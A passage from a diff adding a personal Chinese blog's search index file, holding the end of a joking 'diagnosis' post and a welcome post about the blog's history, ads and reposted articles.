检查结果：<psw>没结果</psw></p><p> 诊断意见：世界成就了他自己</p><p> 处理建议： <psw>放养治疗</psw></p><p> 医生签名：小高</p><p> 处理时间：2021年2月新年</p><p>（码字不易，看完的留下评论吧）</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 原创 </tag>
+            
+            <tag> 总结 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>欢迎大家</title>
+      <link href="/2021/02/05/blogs/welcome/"/>
+      <url>/2021/02/05/blogs/welcome/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script> <span class='p center logo large'>欢迎大家</span><p>十分欢迎大家的到来,一起来我的博客逛逛,玩玩</p><p>小高博客自2017年创立，历经了多次风雨，但是依然没有倒下…</p><p>如今小高博客引入谷歌广告，已经可以赚些小钱弥补家用了。</p><p>我希望能够高质量的写好每一篇文章，不求数量.但求质量，博客文章，主要是回顾自己的历程，写给自己看的，留个回忆。</p><p>部分文章来源于网络，其实搬运并没有多大意义，只是备份一下的作用，</p><p>我本人还是不太喜欢搬运其他人的文章的，</p><p>对于搬运的文章，如有话说，请与我联系。</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 公告 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+  
+  
+</search>
